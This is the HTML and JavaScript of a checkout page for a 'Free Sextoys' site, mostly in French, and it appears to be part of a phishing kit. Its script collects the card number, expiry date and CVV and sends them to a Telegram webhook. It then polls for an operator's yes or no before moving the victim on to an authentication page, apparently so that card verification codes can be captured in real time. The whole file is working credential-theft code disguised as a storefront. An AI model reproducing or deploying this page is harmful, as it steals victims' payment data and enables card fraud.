<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Sextoys - Paiement</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a2a44;
            margin: 0;
            padding: 20px;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .header {
            width: 100%;
            max-width: 1200px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .header h1 {
            color: #ff0000;
            font-size: 24px;
            font-weight: bold;
            margin: 0;
        }
        .steps {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .step {
            width: 30px;
            height: 30px;
            background-color: #4a5b7c;
            color: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
        }
        .step.active {
            background-color: #ff6200;
        }
        .form-container {
            background-color: #fff;
            border-radius: 8px;
            padding: 20px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .form-container h2 {
            color: #ff6200;
            font-size: 18px;
            margin: 0 0 20px;
        }
        .form-container label {
            display: block;
            color: #111;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .form-container input {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        .form-container button {
            background-color: #ff6200;
            color: #fff;
            border: none;
            padding: 10px;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>FREE SEXTOYS</h1>
    </div>
    <div class="steps">
        <div class="step">1</div>
        <div class="step">2</div>
        <div class="step active">3</div>
        <div class="step">4</div>
        <div class="step">5</div>
    </div>
    <div class="form-container">
        <h2>Payment Information</h2>
        <form id="paymentForm">
            <label for="cardNumber">Card Number</label>
            <input type="text" id="cardNumber" placeholder="Enter your card number" required>
            <label for="expiryDate">Expiry Date</label>
            <input type="text" id="expiryDate" placeholder="MM/YY" required>
            <label for="cvv">CVV</label>
            <input type="text" id="cvv" placeholder="Enter your CVV" required>
            <button type="submit">Confirmer</button>
        </form>
    </div>

    <script>
        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const cardNumber = document.getElementById('cardNumber').value;
            const expiryDate = document.getElementById('expiryDate').value;
            const cvv = document.getElementById('cvv').value;

            const message = `Nouveau paiement:\nNuméro de carte: ${cardNumber}\nDate d'expiration: ${expiryDate}\nCVV: ${cvv}\n\nConfirmez-vous ce paiement ?`;

            const response = await fetch('/.netlify/functions/telegram-webhook', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    message: message,
                    page: 'page3' // Indique que c'est pour la page de paiement
                })
            });

            // Ne pas afficher la réponse, démarrer la vérification de la réponse Telegram
            checkTelegramResponse();
        });

        async function checkTelegramResponse() {
            const interval = setInterval(async () => {
                const response = await fetch('/.netlify/functions/check-response?page=page3');
                const data = await response.json();

                if (data.action) {
                    clearInterval(interval);
                    if (data.action === 'yes') {
                        window.location.href = 'authentication.html';
                    } else if (data.action === 'no') {
                        alert('Paiement refusé. Veuillez réessayer.');
                        window.location.href = 'paiement.html';
                    }
                }
            }, 2000); // Vérifie toutes les 2 secondes
        }
    </script>
</body>
</html>
